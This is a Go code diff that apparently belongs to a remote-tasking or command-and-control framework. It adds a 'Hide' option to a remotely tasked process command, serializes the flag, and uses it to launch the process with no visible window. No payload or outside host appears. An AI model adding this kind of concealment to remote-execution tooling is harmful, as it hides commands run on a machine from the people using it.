@@ -24,16 +24,16 @@ type exec uint8
 // Process is a struct that is similar to the 'cmd.Process' struct. This is used to Task a Client with running
 // a specified command. These can be submitted to the Execute tasklet.
 type Process struct {
-	Dir string
+	Filter *cmd.Filter
+	Dir    string
 
 	Env, Args []string
 	Stdin     []byte
 
 	Timeout time.Duration
 	Flags   uint32
-	Filter  *cmd.Filter
-
-	Wait bool
+	Wait    bool
+	Hide    bool
 }
 
 func (exec) Thread() bool {
@@ -98,6 +98,9 @@ func (p Process) MarshalStream(w data.Writer) error {
 	if err := w.WriteUint64(uint64(p.Timeout)); err != nil {
 		return err
 	}
+	if err := w.WriteBool(p.Hide); err != nil {
+		return err
+	}
 	if err := w.WriteBool(p.Filter != nil); err != nil {
 		return err
 	}
@@ -132,13 +135,16 @@ func (p *Process) UnmarshalStream(r data.Reader) error {
 	if err := r.ReadUint64((*uint64)(unsafe.Pointer(&p.Timeout))); err != nil {
 		return err
 	}
+	if err := r.ReadBool(&p.Hide); err != nil {
+		return err
+	}
 	f, err := r.Bool()
 	if err != nil {
 		return err
 	}
 	if f {
 		p.Filter = new(cmd.Filter)
-		if err := p.Filter.UnmarshalStream(r); err != nil {
+		if err = p.Filter.UnmarshalStream(r); err != nil {
 			return err
 		}
 	}
@@ -164,7 +170,9 @@ func (exec) Do(x context.Context, p *com.Packet) (*com.Packet, error) {
 		z.Args = append(z.Args, device.ShellArgs...)
 		z.Args = append(z.Args, strings.Join(e.Args[1:], " "))
 	}
-	z.SetFlags(e.Flags)
+	if z.SetFlags(e.Flags); e.Hide {
+		z.SetWindowDisplay(0)
+	}
 	if z.SetParent(e.Filter); len(e.Stdin) > 0 {
 		z.Stdin = bytes.NewReader(e.Stdin)
 	}
